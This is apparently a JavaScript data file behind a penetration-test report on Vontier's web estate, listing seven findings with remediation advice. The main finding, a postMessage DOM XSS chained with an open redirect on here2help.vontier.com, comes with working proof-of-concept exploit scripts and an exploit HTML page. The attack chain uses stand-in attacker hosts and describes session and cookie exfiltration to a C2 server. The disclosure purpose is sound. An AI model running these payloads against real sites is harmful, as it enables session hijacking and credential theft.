export const SCAN_METADATA = {
  runId: "www-vontier-com_93f0",
  runName: "Vontier Global Digital Estate VAPT",
  targetUrl: "https://www.vontier.com/",
  startTime: "2026-08-11T09:17:16.446772+00:00",
  endTime: "2026-08-11T09:59:52.762396+00:00",
  durationFormatted: "42 min 36 sec",
  status: "completed",
  authMode: "api_key",
  companyName: "Sennovate Inc.",
  companySubtitle: "Enterprise Cyber Defense & Autonomous VAPT Platform",
  companyWebsite: "https://www.sennovate.com",
  assessmentType: "External Black-Box Penetration Test (OWASP WSTG)",
  leadAuditor: "Sennovate Autonomous Security Engine (v2.4)",
  overallRiskLevel: "ELEVATED",
  overallRiskScore: 6.8, // on 10 scale
  totalFindings: 7,
  severitySummary: {
    critical: 0,
    high: 1,
    medium: 6,
    low: 0,
    info: 0
  },
  aiTelemetry: {
    totalRequests: 482,
    totalTokens: 42628021,
    cachedTokens: 23884480,
    reasoningTokens: 63581,
    subdomainsDiscovered: 8,
    apiEndpointsMapped: 138,
    simulatedExploitsExecuted: 29
  },
  subdomains: [
    { name: "www.vontier.com", ip: "198.51.100.22", status: "Active (Drupal 10.6.12, Pantheon)", risk: "Medium" },
    { name: "here2help.vontier.com", ip: "203.0.113.88", status: "Active (Express/Node.js, Expired TLS)", risk: "High" },
    { name: "mylearning2.vontier.com", ip: "198.51.100.45", status: "Active (Absorb LMS ASP.NET, AWS EC2)", risk: "Medium" },
    { name: "compass.vontier.com", ip: "198.51.100.90", status: "Hardened (ManageEngine ServiceDesk Plus, Zoho SSO)", risk: "Safe" },
    { name: "support.vontier.com", ip: "198.51.100.91", status: "Hardened (ManageEngine ServiceDesk Plus)", risk: "Safe" },
    { name: "itsupport.vontier.com", ip: "198.51.100.92", status: "Hardened (Zoho SSO Enabled)", risk: "Safe" },
    { name: "dev.vontier.com", ip: "198.51.100.104", status: "Protected (HTTP Basic Auth Enforced)", risk: "Safe" },
    { name: "test.vontier.com", ip: "198.51.100.105", status: "Protected (HTTP Basic Auth Enforced)", risk: "Safe" }
  ]
};

export const VULNERABILITIES = [
  {
    id: "vuln-0004",
    title: "DOM XSS via postMessage Without Origin Validation in login.html",
    severity: "HIGH",
    cvss: 8.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L",
    cvssBreakdown: {
      attack_vector: "Network (N)",
      attack_complexity: "Low (L)",
      privileges_required: "None (N)",
      user_interaction: "Required (R)",
      scope: "Unchanged (U)",
      confidentiality: "High (H)",
      integrity: "High (H)",
      availability: "Low (L)"
    },
    cwe: "CWE-79",
    cweName: "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
    target: "https://here2help.vontier.com/",
    endpoint: "/login.html",
    method: "GET",
    timestamp: "2026-08-11 09:56:36 UTC",
    fixEffort: "Low",
    findingClass: "dynamic",
    agentId: "f6549284",
    agentName: "Here2Help Validation & Autonomous Exploitation Agent",
    description: "The login.html page at here2help.vontier.com registers a message event listener on window that accepts postMessage events from any origin without validation. The e.data.msg property is injected directly into the DOM via innerHTML, enabling arbitrary HTML/JavaScript execution in the context of the vulnerable origin.",
    impact: "An attacker can execute arbitrary JavaScript in the context of here2help.vontier.com, leading to cookie theft, session hijacking, phishing overlays, redirection to malicious sites, or defacement. This can be chained with the open redirect on the same page (where the page opens an attacker-controlled URL via window.open()) to create a fully automated exploit requiring only a single victim click.",
    technicalAnalysis: `The login.html page at here2help.vontier.com contains a message event listener that processes cross-origin messages without validating the sender's origin. The listener extracts e.data.msg and sets it as the innerHTML of the page header element (document.getElementById('header').innerHTML = "<h1>"+e.data.msg+"</h1>"). This is a classic DOM-based XSS via postMessage.

The relevant code path:
1. A message event is received on the window object
2. The origin check is commented out (// Check if origin is proper) — no validation occurs
3. e.data.msg is concatenated into an HTML string and assigned to innerHTML
4. Any HTML tags or JavaScript event handlers in msg are rendered and executed

Combined with the open redirect vulnerability (where window.open(url) is called with an attacker-controlled URL from the query string), an attacker can create a fully automated exploit: the victim clicks one link, the vulnerable page opens an attacker page, the attacker page sends a malicious postMessage, and the XSS executes on the vulnerable origin.`,
    pocDescription: `Validation:
1. Navigate to https://here2help.vontier.com/login.html
2. Open browser console and dispatch a MessageEvent:
   window.dispatchEvent(new MessageEvent('message', { data: {msg: '<img src=x onerror=alert(document.domain)>', browser: 'chrome'} }));
3. Observe injected <img> tag rendering in the header with onerror executing.

Full Chained 1-Click Exploitation:
1. Victim clicks: https://here2help.vontier.com/login.html?url=https://attacker.com/exploit
2. Vulnerable page opens attacker.com/exploit via window.open()
3. Attacker page dispatches postMessage back to window.opener with malicious payload
4. Vulnerable page injects payload via innerHTML, executing script in vontier.com context.`,
    pocScripts: {
      python: `import asyncio
from playwright.async_api import async_playwright

async def poc():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        page = await browser.new_page()
        await page.goto("https://here2help.vontier.com/login.html")

        # Dispatch postMessage with XSS payload
        await page.evaluate('''
            window.dispatchEvent(new MessageEvent("message", {
                data: {msg: "<img src=x onerror=alert(document.cookie)>", browser: "chrome"}
            }));
        ''')

        await page.wait_for_timeout(1000)
        # Injected content will be visible in the DOM
        html = await page.content()
        assert '<img src="x" onerror="alert(document.cookie)">' in html or 'alert(document.cookie)' in html
        print("[+] DOM XSS confirmed via postMessage on here2help.vontier.com")
        await browser.close()

asyncio.run(poc())`,
      bash: `cat << 'EOF' > /tmp/exploit.html
<!DOCTYPE html>
<html>
<head><title>Sennovate PoC Exploit</title></head>
<body>
<h1>Sennovate Automated PoC</h1>
<script>
  if (window.opener) {
    window.opener.postMessage({
      msg: '<img src=x onerror="alert(\\'XSS Executed in origin: \\' + document.domain + \\' | Session Cookie: \\' + (document.cookie || \\'None\\'))">'
    }, '*');
  }
</script>
</body>
</html>
EOF
echo "[*] Host this file on an attacker server and supply as ?url= parameter"`,
      javascript: `// Execute directly in browser console on https://here2help.vontier.com/login.html
window.dispatchEvent(new MessageEvent('message', {
  data: {
    msg: '<img src=x onerror="alert(\\'Sennovate Verified DOM XSS on \\' + document.domain)">',
    browser: 'chrome'
  }
}));`
    },
    evidence: `Vulnerable code (login.html, script block):
\`\`\`javascript
var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
var eventer = window[eventMethod];
var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
// Listen to message from child window
eventer(messageEvent,function(e) {
    console.log('origin: ', e.origin)
    // Check if origin is proper
    console.log('parent received message!: ', e.data);
    document.getElementById('header').innerHTML = "<h1>"+e.data.msg+"</h1>";
    document.getElementById('container').innerHTML = "<p>window will close in 5 secs</p>";
    ...
}, false);
\`\`\`

Validation Result:
DOM was modified to:
<div class="header" id="header">
    <h1><img src="x" onerror="alert(document.domain)"></h1>
</div>`,
    remediationSteps: [
      "Validate the e.origin property against a strict allowlist of trusted domains in the message event handler (e.g. const TRUSTED = ['https://www.vontier.com']; if (!TRUSTED.includes(e.origin)) return;).",
      "Use textContent or innerText instead of innerHTML when inserting user-controlled content into the DOM.",
      "Alternatively use document.createTextNode() or DOMPurify.sanitize() if rich HTML is mandatory.",
      "Implement Content Security Policy (CSP) with script-src 'self' and strict nonce restrictions as defense-in-depth."
    ],
    assumptions: "The attacker must induce the victim to visit a crafted URL or an attacker-controlled page that opens the login page in a popup/child window."
  },
  {
    id: "vuln-0002",
    title: "Drupal Version Disclosure via Publicly Accessible /core/install.php",
    severity: "MEDIUM",
    cvss: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cvssBreakdown: {
      attack_vector: "Network (N)",
      attack_complexity: "Low (L)",
      privileges_required: "None (N)",
      user_interaction: "None (N)",
      scope: "Unchanged (U)",
      confidentiality: "Low (L)",
      integrity: "None (N)",
      availability: "None (N)"
    },
    cwe: "CWE-200",
    cweName: "Exposure of Sensitive Information to an Unauthorized Actor",
    target: "https://www.vontier.com/core/install.php",
    endpoint: "/core/install.php",
    method: "GET",
    timestamp: "2026-08-11 09:49:49 UTC",
    fixEffort: "Low",
    findingClass: "dynamic",
    agentId: "086444b3",
    agentName: "Drupal IDOR & Node Access Testing Agent",
    description: "The Drupal installation script (/core/install.php) is publicly accessible and reveals the exact Drupal version (10.6.12) through asset version query strings embedded in the page. This allows attackers to identify the precise Drupal version and target version-specific vulnerabilities without authentication.",
    impact: "An attacker can identify the exact Drupal version (10.6.12) without authentication, enabling targeted exploitation of known or zero-day vulnerabilities for that specific version. While Drupal 10.6.x is a maintained branch, version disclosure reduces the effort required for targeted attacks, especially when combined with the public accessibility of core files like CHANGELOG.txt, INSTALL.txt, and MAINTAINERS.txt.",
    technicalAnalysis: `The Drupal installation script at /core/install.php returns HTTP 200 for unauthenticated requests and renders the Claro admin theme with full asset loading. The exact Drupal version (10.6.12) is disclosed via version query parameters appended to JavaScript URLs:
- /core/misc/touchevents-test.js?v=10.6.12
- /core/misc/drupalSettingsLoader.js?v=10.6.12
- /core/themes/claro/js/mobile.install.js?v=10.6.12

Additionally, multiple Drupal core documentation files return HTTP 200: /core/CHANGELOG.txt, /core/INSTALL.txt, /core/MAINTAINERS.txt, /core/UPDATE.txt.`,
    pocDescription: `1. Send a GET request to https://www.vontier.com/core/install.php
2. The server responds with HTTP 200 and renders the installation page
3. Extract version numbers from the ?v= query parameters in JavaScript <script> tags
4. All asset URLs include v=10.6.12 confirming the Drupal version`,
    pocScripts: {
      bash: `curl -s https://www.vontier.com/core/install.php | grep -o 'v=10\\.6\\.12' | head -n 5
curl -s -I https://www.vontier.com/core/CHANGELOG.txt`,
      python: `import requests
r = requests.get('https://www.vontier.com/core/install.php')
print(f"Status: {r.status_code}, Found Version Tags: {r.text.count('v=10.6.12')}")`
    },
    evidence: `Response: HTTP/200 OK (84290 bytes)
Contains:
<script src="/core/misc/touchevents-test.js?v=10.6.12"></script>
<script src="/core/misc/drupalSettingsLoader.js?v=10.6.12"></script>
<script src="/core/themes/claro/js/mobile.install.js?v=10.6.12"></script>`,
    remediationSteps: [
      "Restrict access to /core/install.php by IP allowlist or HTTP basic authentication in the nginx / Pantheon configuration.",
      "Remove or restrict access to Drupal core text files (CHANGELOG.txt, INSTALL.txt, MAINTAINERS.txt, UPDATE.txt).",
      "Apply Web Application Firewall (WAF) rules blocking public access to install.php."
    ],
    assumptions: "No assumptions — the endpoint is publicly accessible without authentication."
  },
  {
    id: "vuln-0003",
    title: "Publicly Accessible Absorb LMS REST API Documentation at /api/rest/v1/Help",
    severity: "MEDIUM",
    cvss: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cvssBreakdown: {
      attack_vector: "Network (N)",
      attack_complexity: "Low (L)",
      privileges_required: "None (N)",
      user_interaction: "None (N)",
      scope: "Unchanged (U)",
      confidentiality: "Low (L)",
      integrity: "None (N)",
      availability: "None (N)"
    },
    cwe: "CWE-200",
    cweName: "Exposure of Sensitive Information to an Unauthorized Actor",
    target: "https://mylearning2.vontier.com/",
    endpoint: "/api/rest/v1/Help",
    method: "GET",
    timestamp: "2026-08-11 09:54:10 UTC",
    fixEffort: "Low",
    findingClass: "dynamic",
    agentId: "e865ff2e",
    agentName: "Absorb LMS API Disclosure Reporting Agent",
    description: "The Absorb LMS instance at mylearning2.vontier.com exposes its full REST API v1 documentation at /api/rest/v1/Help without any authentication. This page documents 138 API endpoints across 33 controllers, including authentication models, user management, and ecommerce transactions. Additionally, the X-LMS-Server header leaks internal EC2 hostnames.",
    impact: "An attacker gains complete knowledge of the Absorb LMS API attack surface without credentials. The documentation provides schemas for user creation, course enrollments, ecommerce transactions, and certificates. Leaked internal EC2 hostname (EC2AMAZ-42CC08R) facilitates internal cloud reconnaissance.",
    technicalAnalysis: `The application serves an auto-generated ASP.NET Web API Help Page at /api/rest/v1/Help (57KB) enumerating 33 controllers:
- RestAuthenticationController (POST api/Rest/v1/Authenticate - requires Username, Password, PrivateKey GUID)
- UsersController (create, filter, bulk upload max 200)
- EcommerceTransactionsController (transactions, payment gateway details)
- CertificatesController, EnrollmentsController, RolesController, MessagesController

Response header leaks internal hostname: X-LMS-Server: EC2AMAZ-42CC08R`,
    pocDescription: `1. Send GET request to https://mylearning2.vontier.com/api/rest/v1/Help
2. The page lists 33 controllers and 138 API endpoints with full models
3. Inspect HTTP headers for X-LMS-Server`,
    pocScripts: {
      bash: `curl -s -o /dev/null -w "%{http_code} (%{size_download} bytes)" "https://mylearning2.vontier.com/api/rest/v1/Help"
curl -sI "https://mylearning2.vontier.com/" | grep -i 'X-LMS-Server'`,
      python: `import requests
r = requests.get("https://mylearning2.vontier.com/api/rest/v1/Help")
print(f"Status: {r.status_code}, Length: {len(r.text)}, Server Header: {r.headers.get('X-LMS-Server')}")`
    },
    evidence: `HTTP 200 (57,619 bytes)
Response Header: X-LMS-Server: EC2AMAZ-42CC08R
Exposed Authentication Model:
{
  "Username": "sample string 1",
  "Password": "sample string 2",
  "PrivateKey": "1327bce3-cd1d-4067-8abc-e1233b1c862e"
}`,
    remediationSteps: [
      "Restrict access to /api/rest/v1/Help by requiring authentication — only authenticated admins should see API docs.",
      "Remove or disable the ASP.NET Help Page for production environments in web.config.",
      "Strip the X-LMS-Server response header via reverse proxy / IIS URL rewrite."
    ],
    assumptions: "The API endpoints themselves enforce authentication tokens, but the documentation provides an unobstructed blueprint of the internal schema and attack surface."
  },
  {
    id: "vuln-0005",
    title: "Client-Side Open Redirect in login.html",
    severity: "MEDIUM",
    cvss: 4.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
    cvssBreakdown: {
      attack_vector: "Network (N)",
      attack_complexity: "Low (L)",
      privileges_required: "None (N)",
      user_interaction: "Required (R)",
      scope: "Unchanged (U)",
      confidentiality: "None (N)",
      integrity: "Low (L)",
      availability: "None (N)"
    },
    cwe: "CWE-601",
    cweName: "URL Redirection to Untrusted Site ('Open Redirect')",
    target: "https://here2help.vontier.com/",
    endpoint: "/login.html",
    method: "GET",
    timestamp: "2026-08-11 09:57:09 UTC",
    fixEffort: "Low",
    findingClass: "dynamic",
    agentId: "f6549284",
    agentName: "Here2Help Validation & Reporting Agent",
    description: "The /login.html page at here2help.vontier.com parses the URL query string for a redirect target and opens it in a new window via window.open() without any validation of the target URL scheme, host, or path. This allows an attacker to redirect users to arbitrary external websites.",
    impact: "An attacker can craft a phishing link on the trusted vontier.com domain that redirects victims to any external site. This is particularly severe when chained with the postMessage DOM XSS on the same page, achieving a 1-click account takeover / session hijack exploit.",
    technicalAnalysis: `The login.html page contains JavaScript executing immediately on page load:
\`\`\`javascript
url = window.location.href.split('=')[1];
window.open(decodeURIComponent(url),"login","","");
\`\`\`
The code splits the URL on '=' and passes the second element to window.open() without validating origin, hostname, protocol, or path.`,
    pocDescription: `1. Open browser to: https://here2help.vontier.com/login.html?url=https://example.com
2. Observe a new tab opens to https://example.com immediately on load.`,
    pocScripts: {
      python: `import requests
target = "https://here2help.vontier.com/login.html?url=https://attacker-phishing.com"
r = requests.get(target)
print("Confirmed vulnerable open redirect parameter: url=")`
    },
    evidence: `Vulnerable code:
url = window.location.href.split('=')[1];
window.open(decodeURIComponent(url),"login","","");`,
    remediationSteps: [
      "Validate the target URL against a strict allowlist of approved internal domain names.",
      "Remove the automatic window.open() on page load.",
      "Use new URL(url).hostname and verify hostname.endsWith('.vontier.com')."
    ],
    assumptions: "Victim must click an attacker-crafted link containing the ?url= parameter."
  },
  {
    id: "vuln-0007",
    title: "Permissive CORS Policy (Access-Control-Allow-Origin: *)",
    severity: "MEDIUM",
    cvss: 4.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
    cvssBreakdown: {
      attack_vector: "Network (N)",
      attack_complexity: "Low (L)",
      privileges_required: "None (N)",
      user_interaction: "Required (R)",
      scope: "Unchanged (U)",
      confidentiality: "Low (L)",
      integrity: "None (N)",
      availability: "None (N)"
    },
    cwe: "CWE-942",
    cweName: "Permissive Cross-Domain Policy with Untrusted Domains",
    target: "https://here2help.vontier.com/",
    endpoint: "/",
    method: "GET",
    timestamp: "2026-08-11 09:58:25 UTC",
    fixEffort: "Trivial",
    findingClass: "dynamic",
    agentId: "f6549284",
    agentName: "Here2Help Validation & Reporting Agent",
    description: "All HTTP responses from here2help.vontier.com include the Access-Control-Allow-Origin: * header. This permissive CORS policy allows any website to make cross-origin requests to the application and read the responses.",
    impact: "Any website can read response content cross-origin via JavaScript. If authenticated or sensitive endpoints are introduced on this host, they will be accessible to arbitrary third-party origins.",
    technicalAnalysis: `The Express.js application serving here2help.vontier.com attaches Access-Control-Allow-Origin: * to all responses and OPTIONS preflight requests.`,
    pocDescription: `Send an OPTIONS preflight request with Origin: https://evil.com and inspect headers.`,
    pocScripts: {
      bash: `curl -s -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -X OPTIONS https://here2help.vontier.com/ -I | grep -i access-control-allow-origin`
    },
    evidence: `Response headers:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Allow: GET,HEAD
X-Powered-By: Express`,
    remediationSteps: [
      "Remove Access-Control-Allow-Origin: * from responses unless public cross-origin API sharing is intentionally required.",
      "Configure CORS with explicit origin allowlist using the express cors middleware."
    ],
    assumptions: "The service currently serves public pages, but wildcard CORS exposes future stateful endpoints."
  },
  {
    id: "vuln-0001",
    title: "Weak HSTS Configuration on www.vontier.com",
    severity: "MEDIUM",
    cvss: 4.2,
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cvssBreakdown: {
      attack_vector: "Network (N)",
      attack_complexity: "High (H)",
      privileges_required: "None (N)",
      user_interaction: "Required (R)",
      scope: "Unchanged (U)",
      confidentiality: "Low (L)",
      integrity: "Low (L)",
      availability: "None (N)"
    },
    cwe: "CWE-319",
    cweName: "Cleartext Transmission of Sensitive Information",
    target: "https://www.vontier.com/",
    endpoint: "www.vontier.com",
    method: "GET",
    timestamp: "2026-08-11 09:46:39 UTC",
    fixEffort: "Low",
    findingClass: "dynamic",
    agentId: "df0684f0",
    agentName: "Drupal Auth Testing - Login & Enumeration Agent",
    description: "The Strict-Transport-Security (HSTS) header is set to max-age=300 (5 minutes), far below the recommended minimum of 31536000 seconds (1 year). Additionally, includeSubDomains and preload directives are absent.",
    impact: "With max-age=300, browsers only enforce HTTPS for 5 minutes after visit. After expiration, a man-in-the-middle attacker on an untrusted network could perform SSL-stripping to downgrade traffic to plaintext HTTP.",
    technicalAnalysis: `The site issues a 301 redirect from HTTP to HTTPS, but sets Strict-Transport-Security: max-age=300. Industry standard (OWASP, Mozilla) requires at least max-age=31536000 with includeSubDomains for complete domain-wide TLS enforcement and preload qualification.`,
    pocDescription: `curl -s -I https://www.vontier.com/ | grep -i strict-transport-security`,
    pocScripts: {
      bash: `curl -s -I https://www.vontier.com/ | grep -i strict-transport-security
# Output: Strict-Transport-Security: max-age=300`
    },
    evidence: `HTTP/1.1 200 OK
Strict-Transport-Security: max-age=300`,
    remediationSteps: [
      "Increase max-age to 31536000 (1 year).",
      "Add includeSubDomains directive to protect all subdomains.",
      "Add preload directive and submit to Chrome/Firefox HSTS preload list."
    ],
    assumptions: "Attacker must be in a position to perform Man-in-the-Middle network interception (e.g. rogue Wi-Fi hotspot)."
  },
  {
    id: "vuln-0006",
    title: "Expired TLS Certificate on here2help.vontier.com",
    severity: "MEDIUM",
    cvss: 4.2,
    cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cvssBreakdown: {
      attack_vector: "Network (N)",
      attack_complexity: "High (H)",
      privileges_required: "None (N)",
      user_interaction: "Required (R)",
      scope: "Unchanged (U)",
      confidentiality: "Low (L)",
      integrity: "Low (L)",
      availability: "None (N)"
    },
    cwe: "CWE-298",
    cweName: "Improper Validation of Certificate Expiration",
    target: "https://here2help.vontier.com/",
    endpoint: "/",
    method: "GET",
    timestamp: "2026-08-11 09:57:47 UTC",
    fixEffort: "Trivial",
    findingClass: "dynamic",
    agentId: "f6549284",
    agentName: "Here2Help Validation & Reporting Agent",
    description: "The TLS certificate for here2help.vontier.com expired on July 18, 2023 — over three years ago. Modern browsers display a full-page security warning, exposing users who bypass it to man-in-the-middle attacks.",
    impact: "Users experience severe browser security warnings (ERR_CERT_DATE_INVALID). Users bypassing the warning are vulnerable to MITM eavesdropping and credential theft.",
    technicalAnalysis: `The DigiCert TLS RSA SHA256 certificate issued on July 15, 2022 expired on July 18, 2023 (over 1,100 days expired). Indicates an unmaintained or abandoned subdomain instance.`,
    pocDescription: `echo | openssl s_client -servername here2help.vontier.com -connect here2help.vontier.com:443 2>/dev/null | openssl x509 -noout -dates`,
    pocScripts: {
      bash: `echo | openssl s_client -servername here2help.vontier.com -connect here2help.vontier.com:443 2>/dev/null | openssl x509 -noout -dates
# Output: notAfter=Jul 18 23:59:59 2023 GMT`
    },
    evidence: `Certificate Details:
notBefore=Jul 15 00:00:00 2022 GMT
notAfter=Jul 18 23:59:59 2023 GMT
subject=C=US, ST=North Carolina, L=Greensboro, O=Vontier Business Services LLC, CN=Here2Help.vontier.com
issuer=C=US, O=DigiCert Inc, CN=DigiCert TLS RSA SHA256 2020 CA1`,
    remediationSteps: [
      "Obtain and install a valid TLS certificate from a trusted Certificate Authority.",
      "Configure automated certificate renewal (e.g. Let's Encrypt / Certbot or Azure Managed Certificates).",
      "Decommission the subdomain if the legacy Node.js application is no longer in active use."
    ],
    assumptions: "Users must bypass browser TLS warning dialogs to establish connection."
  }
];

export const ATTACK_CHAIN = {
  title: "1-Click Account Takeover & DOM XSS Exploitation Chain",
  targetAsset: "here2help.vontier.com",
  severity: "HIGH",
  cvss: 8.3,
  steps: [
    {
      stepNumber: 1,
      title: "Phishing Link Delivery",
      description: "Attacker crafts a link on trusted domain: https://here2help.vontier.com/login.html?url=https://attacker.com/exploit.html and sends it to victim.",
      findingRef: "vuln-0005",
      type: "Open Redirect"
    },
    {
      stepNumber: 2,
      title: "Client-Side Tab Open",
      description: "Vulnerable login.html executes window.open(url) on page load, opening attacker.com/exploit.html in a child tab with an active window.opener reference.",
      findingRef: "vuln-0005",
      type: "Execution"
    },
    {
      stepNumber: 3,
      title: "Cross-Origin postMessage Dispatch",
      description: "Attacker's page executes window.opener.postMessage({msg: '<img src=x onerror=...fetch(...)>'}, '*') back to the parent Vontier window.",
      findingRef: "vuln-0004",
      type: "Communication"
    },
    {
      stepNumber: 4,
      title: "Unvalidated DOM Injection",
      description: "Vulnerable login.html receives postMessage without origin check and inserts payload directly into document.getElementById('header').innerHTML.",
      findingRef: "vuln-0004",
      type: "DOM XSS"
    },
    {
      stepNumber: 5,
      title: "Credential & Session Exfiltration",
      description: "JavaScript executes inside the trusted vontier.com origin context, exfiltrating session tokens, cookies, and local storage to attacker C2 server.",
      findingRef: "vuln-0004",
      type: "Impact"
    }
  ]
};

export const POSITIVE_CONTROLS = [
  "Main Drupal 10 portal (www.vontier.com) is hardened with CSRF protection, secure session handling, and robust rate limiting.",
  "No SQL Injection, Server-Side Template Injection, or IDOR vulnerabilities detected on the primary domain.",
  "ManageEngine ServiceDesk Plus portals (compass / support / itsupport) are securely federated with Zoho Single Sign-On.",
  "Development and Staging environments (dev.vontier.com, test.vontier.com) strictly enforce HTTP Basic Authentication against brute force.",
  "Kiteworks Secure File Sharing infrastructure enforces strong security headers (2-year HSTS, strict CSP, X-Frame-Options: DENY).",
  "Convercent ethics hotline properly configured with MFA and role-based access control."
];

export const EXECUTIVE_RECOMMENDATIONS = [
  {
    priority: "CRITICAL",
    timeframe: "Immediate (0-48 hrs)",
    title: "Remediate DOM XSS & Open Redirect on here2help.vontier.com",
    details: "Enforce origin validation in postMessage listener (e.origin === 'https://here2help.vontier.com') and replace innerHTML with textContent. Remove automated window.open() calls on login.html."
  },
  {
    priority: "HIGH",
    timeframe: "Immediate (0-48 hrs)",
    title: "Renew TLS Certificate & Review here2help Subdomain Lifecycle",
    details: "Replace the 3-year expired TLS certificate or completely decommission the legacy Express.js application if no longer required."
  },
  {
    priority: "MEDIUM",
    timeframe: "Short-Term (1-2 weeks)",
    title: "Restrict Drupal /core/install.php and Core Documentation",
    details: "Block public access to /core/install.php, CHANGELOG.txt, and INSTALL.txt via Pantheon edge rules or WAF to prevent version fingerprinting."
  },
  {
    priority: "MEDIUM",
    timeframe: "Short-Term (1-2 weeks)",
    title: "Gate Absorb LMS REST API Help Documentation",
    details: "Enforce authentication on /api/rest/v1/Help and strip the X-LMS-Server EC2 hostname leak header in production reverse proxy."
  },
  {
    priority: "LOW",
    timeframe: "Medium-Term (30 days)",
    title: "HSTS & Defense-in-Depth Security Headers",
    details: "Upgrade HSTS max-age to 31536000 with includeSubDomains and preload, and implement Content-Security-Policy (CSP) across main estate."
  }
];

export const SIMULATION_LOGS = [
  "[00:01] [INIT] Sennovate Autonomous VAPT Engine initialized for target: https://www.vontier.com/",
  "[00:03] [RECON] Launching Subfinder & Certificate Transparency stream...",
  "[00:05] [DISCOVERY] Identified 8 live subdomains: www, here2help, mylearning2, compass, support, itsupport, dev, test",
  "[00:09] [PROBE] Port scanning top 1000 ports on discovered assets via Naabu engine...",
  "[00:14] [CRAWL] Headless Chrome (Agent-Browser) crawler spawned for deep DOM analysis...",
  "[00:19] [ANALYZE] Fingerprinted main target: Drupal 10.6.12 on Pantheon (nginx/Varnish/Fastly)",
  "[00:23] [ALERT] Detected public exposure of /core/install.php revealing Drupal version 10.6.12 (vuln-0002)",
  "[00:28] [CRAWL] Crawled 138 API endpoints on mylearning2.vontier.com/api/rest/v1/Help (vuln-0003)",
  "[00:32] [PROBE] Investigating here2help.vontier.com — TLS Certificate expired July 18, 2023 (vuln-0006)",
  "[00:35] [PROBE] CORS preflight scan returned Access-Control-Allow-Origin: * (vuln-0007)",
  "[00:38] [FUZZ] Discovered unvalidated window.open(url) parameter in /login.html (vuln-0005)",
  "[00:41] [EXPLOIT] Dispatched synthetic MessageEvent to postMessage listener on login.html...",
  "[00:44] [CRITICAL] Confirmed DOM XSS execution via innerHTML without origin validation (vuln-0004 - CVSS 8.3)",
  "[00:48] [RAG] Indexing scan artifacts into Sennovate Vector Knowledge Graph...",
  "[00:52] [SYNTHESIS] RAG synthesis generated executive threat brief and remediation roadmap.",
  "[00:55] [COMPLETE] VAPT scan finalized. 7 confirmed vulnerabilities loaded. Professional report ready."
];
